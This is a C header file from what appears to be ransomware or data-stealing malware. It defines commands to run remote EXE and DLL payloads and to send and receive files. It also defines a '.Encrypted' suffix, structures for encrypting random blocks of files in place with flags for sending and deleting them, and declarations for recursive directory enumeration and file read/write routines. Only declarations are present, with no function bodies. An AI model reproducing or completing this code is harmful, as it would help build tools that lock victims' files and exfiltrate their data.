

#define COMMAND_RUN_EXE		0x00000001
#define COMMAND_RUN_DLL		0x00000002
#define COMMAND_REVICE_FILE	0x00000003
#define COMMAND_SEND_FILE	0x00000004
#define COMMAND_COMPLETE	0x00000005
#define COMMAND_OVER		0x00000006

#define ENCRYPT_TAIL		L".Encrypted"

typedef struct _CHECK_COMMAND
{
	ULONG ulCommand;
}CHECK_COMMAND,*PCHECK_COMMAND;

typedef struct _RANDOM_BLOCK
{
	LIST_ENTRY ListRandomBlock;
	ULONG ulIndex;
	PCHAR pCryptDat;
	ULONG_PTR ulCryptDatLength;
	ULONG ulOffset;
	BOOLEAN bInitialize;
}RANDOM_BLOCK,*PRANDOM_BLOCK;

typedef struct _SEND_FILE_INFO 
{
	LIST_ENTRY List;
	LIST_ENTRY RandomBlockList;
	BYTE FileHash[32];
	ULONG_PTR ulFileSize;
	ULONG_PTR ulRandomCount;
	BOOLEAN bIsInitialize;
	BOOLEAN bIsCrypt;
	BOOLEAN bIsSend;
	BOOLEAN bIsDel;
	WCHAR wFileName[MAX_PATH];
	WCHAR wFileFullPath[MAX_PATH];
}SEND_FILE_INFO,*PSEND_FILE_INFO;

typedef struct _SEND_FILE_DAT
{
	CHECK_COMMAND CmdLine;
	BYTE FileHash[32];
	ULONG_PTR ulFileSize;
	ULONG_PTR ulRandomCount;
	BOOLEAN bIsCrypt;
	WCHAR wFileName[MAX_PATH];
}SEND_FILE_DAT,*PSEND_FILE_DAT;

typedef struct _SEND_RANDOM_BLOCK
{
	ULONG ulIndex;
	ULONG_PTR ulCryptDatLength;
	ULONG ulOffset;
}SEND_RANDOM_BLOCK,*PSEND_RANDOM_BLOCK;

extern LIST_ENTRY g_SendFileList;
extern CRITICAL_SECTION g_CriticalSection;
extern HANDLE g_hEventFindInfinite; 
extern WCHAR g_wCurPath[MAX_PATH];

void EnumDirectoryFile(WCHAR *wDirectory);
void EnumDirectoryFileEx(WCHAR *wDirectory);
void InitializeList();
BOOLEAN GetFileInfo(WCHAR *wFilePath,PSEND_FILE_INFO pSendFileInfo);
BOOLEAN GetFileSize(WCHAR *wFilePath,PSEND_FILE_INFO pSendFileInfo);
ULONG GetRandomInt(ULONG ulMin,ULONG ulMax);
ULONG GetFileDat(WCHAR *wFilePath,PVOID pDatBuf,ULONG ulOffset,ULONG ulLength);
ULONG SetFileDat(WCHAR *wFilePath,PVOID pDatBuf,ULONG ulOffset,ULONG ulLength);
ULONG_PTR CreateRandomBlock(PSEND_FILE_INFO pSendFileInfo);